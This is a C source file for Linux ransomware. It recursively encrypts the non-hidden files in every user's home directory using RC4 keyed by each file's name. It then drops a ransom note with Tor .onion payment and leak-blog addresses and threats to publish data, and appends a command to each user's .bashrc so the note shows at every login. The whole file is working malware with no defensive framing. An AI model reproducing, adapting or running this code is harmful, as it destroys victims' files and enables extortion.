#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <pwd.h>
#include <dirent.h>
#define HOME_PATH "/home"

unsigned char Sbox[256];

void writeRansom(char *user) {
    char *ransomNote = (char*)malloc(1024 * sizeof(char));
    sprintf(ransomNote,
        "Your files have been encrypted.\n"
        "We highly suggest not shutting down your computer in case encryption process is not finished, as your files may get corrupted.\n"
        "In order to decrypt your files, you must pay for the decryption key & application.\n"
        "You may do so by visiting us at http://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad.onion.\n"
        "This is an onion address that you may access using Tor Browser which you may download at https://www.torproject.org/download/\n"
        "Details such as pricing, how long before the price increases and such will be available to you once you enter your ID presented to you below in this note in our website.\n"
        "Contact us soon, because those who don't have their data leaked in our press release blog and the price they'll have to pay will go up significantly.\n"
        "The corporations whom don't pay or fail to respond in a swift manner can be found in our blog, accessible at http://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad.onion\n");

    char filePath[256], userHome[256];
    snprintf(userHome, sizeof(userHome), "%s/%s", HOME_PATH, user);
    snprintf(filePath, sizeof(filePath), "%s/ransom_note.txt", userHome);
    FILE *file = fopen(filePath, "w");
    if (file) {
        fprintf(file, "%s", ransomNote);
        fclose(file);
    }

    char command[1024];
    snprintf(command, sizeof(command),"bash -c 'echo \"cat %s\" >> /home/%s/.bashrc'",filePath, user);
    system(command);
    printf("write complete\n");
    free(ransomNote);
}

int strstarts(const char *str, const char *prefix)
{
    return strncmp(str, prefix, strlen(prefix));
}

void swap(unsigned char *a, unsigned char *b) {
    unsigned char temp = *a;
    *a = *b;
    *b = temp;
}

void KSA(char* key) {
    for (int i = 0; i < 256; i++) {
        Sbox[i] = i;
    }
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + Sbox[i] + key[i%strlen(key)]) % 256;
        swap(&Sbox[i], &Sbox[j]);
    }

}

//1. i = (i + 1) % 256
// 2. j = (j + S[i]) % 256
// 3. Hoán vị S[i] và S[j]
// 4. Keystream byte = S[(S[i] + S[j]) % 256]
void PRGA(unsigned char* input, int length) {
    unsigned char* key = (unsigned char*)malloc(length);
    if (!key) {
        perror("malloc");
        return;
    }

    int i = 0, j = 0;
    for (int k = 0 ; k < length; k++) {
        i = (i + 1) % 256;
        j = (j + Sbox[i]) % 256;
        swap(&Sbox[i], &Sbox[j]);
        key[k] = Sbox[(Sbox[i] + Sbox[j]) % 256];
    }

    for (int k = 0; k < length; k++) {
        input[k] ^= key[k];
    }

    free(key);
}

void encrypted(char *path, char *filename) {
    FILE *file = fopen(path, "rb+");
    if (file == NULL) {
        perror("fopen");
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (fileSize <= 0) {
        fprintf(stderr, "Invalid file size: %ld\n", fileSize);
        fclose(file);
        return;
    }

    char *buffer = (char*)malloc(fileSize);
    if (buffer == NULL) {
        perror("malloc");
        fclose(file);
        return;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != fileSize) {
        perror("fread");
        free(buffer);
        fclose(file);
        return;
    }

    KSA(filename);
    PRGA((unsigned char*)buffer, fileSize);

    fseek(file, 0, SEEK_SET);
    size_t bytesWritten = fwrite(buffer, 1, fileSize, file);
    if (bytesWritten != fileSize) {
        perror("fwrite");
        free(buffer);
        fclose(file);
        return;
    }

    fflush(file);
    fclose(file);
    free(buffer);

    printf("Encrypted: %s\n", path);
}

int listDir(char* path) {
    DIR *dir = opendir(path);
    if (dir == NULL) {
        perror("opendir");
        return -1;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subPath[1024];
                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
                if (strstarts(entry->d_name, ".") && strstarts(entry->d_name, "ransom")) {
                    listDir(subPath);
                }
            }
        } else {
            char fullPath[1024];
            snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);
            if (strstarts(entry->d_name, ".")) {
                encrypted(fullPath, entry->d_name);
            }
        }
    }
    closedir(dir);
    return 0;
}


int main() {
    struct passwd *user;
    while (user = getpwent()) {
        if (strstarts(user->pw_dir, "/home") == 0) {
            if( strncmp(user->pw_name, "cups-pk-helper", strlen("cups-pk-helper")) == 0 ||
                strncmp(user->pw_name, "syslog", strlen("syslog")) == 0) {
                continue;
            }
            listDir(user->pw_dir);
            writeRansom(user->pw_name);
        }
    }
    return 0;
}